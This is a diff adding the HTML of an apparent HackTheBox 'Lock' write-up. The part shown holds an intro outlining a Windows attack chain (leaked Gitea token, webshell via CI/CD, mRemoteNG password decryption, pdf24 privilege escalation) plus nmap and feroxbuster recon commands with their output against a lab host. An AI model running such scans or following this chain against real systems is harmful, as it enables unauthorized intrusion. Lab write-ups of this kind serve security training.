@@ -1,0 +1,952 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Lock</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-lock">htb-lock</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-bastion">htb-bastion</a> <a class="post-tag" href="/tags#vulnlab">vulnlab</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#gitea">gitea</a> <a class="post-tag" href="/tags#gitea-api">gitea-api</a> <a class="post-tag" href="/tags#swagger">swagger</a> <a class="post-tag" href="/tags#webshell">webshell</a> <a class="post-tag" href="/tags#mremoteng">mremoteng</a> <a class="post-tag" href="/tags#mremoteng-decrypt">mremoteng-decrypt</a> <a class="post-tag" href="/tags#netexec">netexec</a> <a class="post-tag" href="/tags#netexec-rdp-exec">netexec-rdp-exec</a> <a class="post-tag" href="/tags#xfreerdp">xfreerdp</a> <a class="post-tag" href="/tags#pdf24">pdf24</a> <a class="post-tag" href="/tags#cve-2023-49147">cve-2023-49147</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-08-21T09:00:00+00:00" itemprop="datePublished">Aug 21, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/08/21/htb-lock.html" style="color: #e6e6e6; text-decoration: none;">HTB: Lock</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/lock-cover.webp" type="image/webp"/>
+<img alt="Lock" class="include_image" loading="lazy" src="/img/lock-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Lock starts with a Gitea instance where I’ll find an API token in an old commit. I’ll use that to access a private repo for the website. The repo is setup with CI/CD so that the production website is updated when the repo changes. I’ll add an ASPX webshell and get a foothold on the box. I’ll find a mRemoteNG config file and decrypt it to get the next user’s password and RDP access. From there I’ll exploit a vulnerability in the pdf24 installer repair functionality by putting a lock on a log file it wants to write, and running it. When a cmd.exe window hangs open, I’ll abuse a few steps to get a cmd.exe running as SYSTEM.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/699 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/lock" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Lock</a> <a href="https://hackthebox.com/machines/lock" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-lock.webp" type="image/webp"/> <img alt="Lock" class="img-av" src="/icons/box-lock.png"/></picture></a><br/><a href="https://hackthebox.com/machines/lock" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1958559774481543564">21 Aug 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">21 Aug 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/> <a href="https://app.hackthebox.com/users/637320" rel="noopener" target="_blank"><img alt="kozmer" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/637320" style="display: unset"/><span class="user-text" style="display: none"> kozmer</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds four open TCP ports, HTTP (80, 3000), SMB (445), and RDP (3389):</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="1700"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.129.234.64
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-15 20:23 UTC
+...[snip]...
+Scanned at 2025-08-15 20:23:12 UTC for 13s
+Not shown: 65531 filtered tcp ports (no-response)
+PORT     STATE SERVICE       REASON
+80/tcp   open  http          syn-ack ttl 127
+445/tcp  open  microsoft-ds  syn-ack ttl 127
+3000/tcp open  ppp           syn-ack ttl 127
+3389/tcp open  ms-wbt-server syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds
+           Raw packets sent: 131079 (5.767MB) | Rcvd: 14 (600B)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 80,445,3000,3389 <span class="nt">-sCV</span> 10.129.234.64
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-15 20:24 UTC
+Nmap scan report for 10.129.234.64
+Host is up (0.091s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Lock - Index
+445/tcp  open  microsoft-ds?
+3000/tcp open  ppp?
+| fingerprint-strings:
+|   GenericLines, Help, RTSPRequest:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=2212747db187de4d; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=Ip28VVc-sj5pyfscTYff-l6raHQ6MTc1NTI4OTQ3NzM5NzkwMDUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Fri, 15 Aug 2025 20:24:37 GMT
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en-US" class="theme-auto"&gt;
+|     &lt;head&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;
+|     &lt;link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
+|   HTTPOptions:
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=7e9cbbabd1bd8fba; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=oXtAV8JGDSCEr5-B8W17rXg_dyU6MTc1NTI4OTQ4MzE3NzE2NzUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Fri, 15 Aug 2025 20:24:43 GMT
+|_    Content-Length: 0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-08-15T20:26:41+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Lock
+| Not valid before: 2025-04-15T00:34:47
+|_Not valid after:  2025-10-15T00:34:47
+| rdp-ntlm-info:
+|   Target_Name: LOCK
+|   NetBIOS_Domain_Name: LOCK
+|   NetBIOS_Computer_Name: LOCK
+|   DNS_Domain_Name: Lock
+|   DNS_Computer_Name: Lock
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-08-15T20:26:01+00:00
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.94SVN%I=7%D=8/15%Time=689F9784%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+SF:d\x20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
+SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
+SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
+SF:ea=2212747db187de4d;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
+SF:kie:\x20_csrf=Ip28VVc-sj5pyfscTYff-l6raHQ6MTc1NTI4OTQ3NzM5NzkwMDUwMA;\x
+SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
+SF:ions:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2015\x20Aug\x202025\x2020:24:37\x
+SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en-US\"\x20class=\"the
+SF:me-auto\"&gt;\n&lt;head&gt;\n\t&lt;meta\x20name=\"viewport\"\x20content=\"width=dev
+SF:ice-width,\x20initial-scale=1\"&gt;\n\t&lt;title&gt;Gitea:\x20Git\x20with\x20a\x
+SF:20cup\x20of\x20tea&lt;/title&gt;\n\t&lt;link\x20rel=\"manifest\"\x20href=\"data:
+SF:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHR
+SF:lYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3Rhcn
+SF:RfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwO
+SF:i8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9w
+SF:bmciLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
+SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
+SF:\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Me
+SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x2
+SF:0GET\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x2
+SF:0no-transform\r\nSet-Cookie:\x20i_like_gitea=7e9cbbabd1bd8fba;\x20Path=
+SF:/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=oXtAV8JGDSCEr5-
+SF:B8W17rXg_dyU6MTc1NTI4OTQ4MzE3NzE2NzUwMA;\x20Path=/;\x20Max-Age=86400;\x
+SF:20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\
+SF:x20Fri,\x2015\x20Aug\x202025\x2020:24:43\x20GMT\r\nContent-Length:\x200
+SF:\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
+SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
+SF:\n400\x20Bad\x20Request");
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2025-08-15T20:26:03
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 132.16 seconds
+</span></code></pre></div></div>
+<p>The box looks to be Windows (SMB and RDP). RDP shows the hostname as LOCK, though it doesn’t appear to be part of an Active Directory domain.</p>
+<p>On port 3000, it sets a cookie <code class="language-plaintext highlighter-rouge">Set-Cookie: i_like_gitea=2212747db187de4d</code>, which suggests a Gitea instance.</p>
+<p>All of the ports show a TTL of 127, which matches the <a href="/cheatsheets/os#os-identification">expected TTL</a> for Windows one hop away.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for a company that provides document editing services:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20250815171436519.webp" type="image/webp"/>
+<img alt="image-20250815171436519" class="include_image" loading="lazy" src="/img/image-20250815171436519.png" style="max-height: 500px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>All of the links lead to anchors on the index page, so nothing else to explore.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers show the server is running ASP.NET:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Thu, 28 Dec 2023 14:07:59 GMT</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">"675cb2439739da1:0"</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Microsoft-IIS/10.0</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">ASP.NET</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 15 Aug 2025 21:32:31 GMT</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">16054</span>
+</code></pre></div></div>
+<p>The main page loads as <code class="language-plaintext highlighter-rouge">/index.html</code>, suggesting a static site. The 404 page is the <a href="/cheatsheets/404#iis">default IIS 404</a>:</p>
+<picture>
+<source srcset="/img/image-20250815171701035.webp" type="image/webp"/>
+<img alt="image-20250815171701035" class="include_image" loading="lazy" src="/img/image-20250815171701035.png"/>
+</picture>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x html</code> since there’s an <code class="language-plaintext highlighter-rouge">index.html</code> and with a lowercase wordlist as IIS is not case sensitive:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="500"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.234.64 <span class="nt">-x</span> html <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt <span class="nt">--dont-extract-links</span>
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.234.64
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💲  Extensions            │ [html]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      347l     1183w    16054c http://10.129.234.64/
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      158c http://10.129.234.64/aspnet_client =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/aspnet_client/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      151c http://10.129.234.64/assets =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/assets/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      154c http://10.129.234.64/assets/js =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/assets/js/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      155c http://10.129.234.64/assets/css =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/assets/css/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      155c http://10.129.234.64/assets/img =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/assets/img/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      347l     1183w    16054c http://10.129.234.64/index.html
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      163c http://10.129.234.64/assets/img/clients =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/assets/img/clients/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      165c http://10.129.234.64/assets/img/portfolio =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/assets/img/portfolio/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      168c http://10.129.234.64/assets/img/testimonials =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/assets/img/testimonials/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      158c http://10.129.234.64/assets/vendor =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/assets/vendor/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      161c http://10.129.234.64/assets/img/slide =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/assets/img/slide/</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1914c http://10.129.234.64/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1928c http://10.129.234.64/aspnet_client/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1921c http://10.129.234.64/assets/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1925c http://10.129.234.64/assets/img/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1924c http://10.129.234.64/assets/js/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1925c http://10.129.234.64/assets/css/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1933c http://10.129.234.64/assets/img/clients/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1935c http://10.129.234.64/assets/img/portfolio/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1938c http://10.129.234.64/assets/img/testimonials/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1928c http://10.129.234.64/assets/vendor/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1931c http://10.129.234.64/assets/img/slide/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1914c http://10.129.234.64/aux
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1921c http://10.129.234.64/assets/aux
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1928c http://10.129.234.64/aspnet_client/aux
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1925c http://10.129.234.64/assets/img/aux
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1924c http://10.129.234.64/assets/js/aux
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1925c http://10.129.234.64/assets/css/aux
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1933c http://10.129.234.64/assets/img/clients/aux
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1935c http://10.129.234.64/assets/img/portfolio/aux
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1938c http://10.129.234.64/assets/img/testimonials/aux
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1928c http://10.129.234.64/assets/vendor/aux
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1931c http://10.129.234.64/assets/img/slide/aux
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      169c http://10.129.234.64/aspnet_client/system_web =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/aspnet_client/system_web/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        2l       10w      162c http://10.129.234.64/assets/vendor/aos =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.64/assets/vendor/aos/</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1939c http://10.129.234.64/aspnet_client/system_web/con
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        0l        0w     1245c http://10.129.234.64/assets/img/apa
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/error%1F_log.html
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/aspnet_client/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/aspnet_client/error%1F_log.html
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/error%1F_log.html
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/img/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/img/error%1F_log.html
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/css/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/js/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/css/error%1F_log.html
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/js/error%1F_log.html
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/img/clients/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/img/clients/error%1F_log.html
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/img/portfolio/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/img/portfolio/error%1F_log.html
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1932c http://10.129.234.64/assets/vendor/aos/con
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/img/testimonials/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/img/testimonials/error%1F_log.html
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/vendor/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/vendor/error%1F_log.html
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/img/slide/error%1F_log
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1914c http://10.129.234.64/prn
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1939c http://10.129.234.64/aspnet_client/system_web/aux
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/img/slide/error%1F_log.html
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1928c http://10.129.234.64/aspnet_client/prn
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1921c http://10.129.234.64/assets/prn
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1925c http://10.129.234.64/assets/css/prn
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1925c http://10.129.234.64/assets/img/prn
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1924c http://10.129.234.64/assets/js/prn
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1933c http://10.129.234.64/assets/img/clients/prn
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1935c http://10.129.234.64/assets/img/portfolio/prn
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1938c http://10.129.234.64/assets/img/testimonials/prn
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1928c http://10.129.234.64/assets/vendor/prn
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1932c http://10.129.234.64/assets/vendor/aos/aux
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1931c http://10.129.234.64/assets/img/slide/prn
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/aspnet_client/system_web/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/aspnet_client/system_web/error%1F_log.html
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/vendor/aos/error%1F_log
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.64/assets/vendor/aos/error%1F_log.html
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1939c http://10.129.234.64/aspnet_client/system_web/prn
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       42l      157w     1932c http://10.129.234.64/assets/vendor/aos/prn
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 8m    345592/345592  0s      </span><span class="feroxbuster-green">found</span><span class="go">:80      </span><span class="feroxbuster-red">errors</span><span class="go">:1
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 7m     26584/26584   68/s    http://10.129.234.64/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 7m     26584/26584   68/s    http://10.129.234.64/aspnet_client/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 7m     26584/26584   68/s    http://10.129.234.64/assets/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 7m     26584/26584   67/s    http://10.129.234.64/assets/js/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 7m     26584/26584   67/s    http://10.129.234.64/assets/css/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 7m     26584/26584   67/s    http://10.129.234.64/assets/img/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 7m     26584/26584   67/s    http://10.129.234.64/assets/img/clients/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 7m     26584/26584   67/s    http://10.129.234.64/assets/img/portfolio/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 7m     26584/26584   67/s    http://10.129.234.64/assets/img/testimonials/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 7m     26584/26584   67/s    http://10.129.234.64/assets/vendor/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 6m     26584/26584   69/s    http://10.129.234.64/assets/img/slide/
